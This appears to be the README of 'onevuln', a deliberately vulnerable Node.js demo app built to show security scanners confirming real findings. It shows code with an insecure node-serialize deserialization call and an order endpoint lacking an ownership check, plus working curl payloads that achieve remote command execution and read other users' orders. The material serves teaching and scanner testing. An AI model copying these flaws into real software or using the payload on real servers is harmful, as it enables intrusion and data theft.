# onevuln

Minimal educational demo app with a small set of intentionally simple,
exploitable vulnerabilities — built to show scanners (SAST/SCA/DAST) proving
findings are real.

## Vulnerability 1: Insecure Deserialization (SAST + SCA, same code path)

[server.js](server.js) deserializes an untrusted query parameter with
`node-serialize`:

```js
const user = serialize.unserialize(req.query.data);
```

- **SAST finding**: Insecure Deserialization of untrusted input (CWE-502,
  OWASP A08:2021 – Software and Data Integrity Failures).
- **SCA finding**: `node-serialize@0.0.4` is a known-vulnerable dependency
  ([CVE-2017-5941](https://security.snyk.io/vuln/npm:node-serialize:20170208),
  CVSS 9.8) — `unserialize()` executes attacker-supplied IIFEs embedded in the
  payload.

Both tools point at the same line, because the SAST pattern (untrusted input
reaching `unserialize`) *is* the SCA CVE's exploit mechanism — one root cause,
two findings, trivially provable as reachable/exploitable.

## Run it

```bash
npm install
npm start
```

## Exploit it

```bash
curl --get --data-urlencode \
  'data={"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned.txt\");}()"}' \
  http://localhost:3000/profile

cat /tmp/pwned.txt   # proves arbitrary command execution
```

This runs `id` on the server and writes the output to `/tmp/pwned.txt`,
demonstrating full remote code execution via the single vulnerable line
above.

## Vulnerability 2: IDOR (Broken Access Control)

[server.js](server.js) serves orders by id with no check that the caller
owns the order:

```js
app.get('/orders/:id', (req, res) => {
  res.json(orders[req.params.id]);
});
```

- **Finding**: Insecure Direct Object Reference (CWE-639, OWASP A01:2021 –
  Broken Access Control).

### Exploit it

```bash
curl http://localhost:3000/orders/1001   # alice's order
curl http://localhost:3000/orders/1002   # bob's order — returned with no auth check
```

Simply incrementing the id in the URL discloses another user's private
order data.
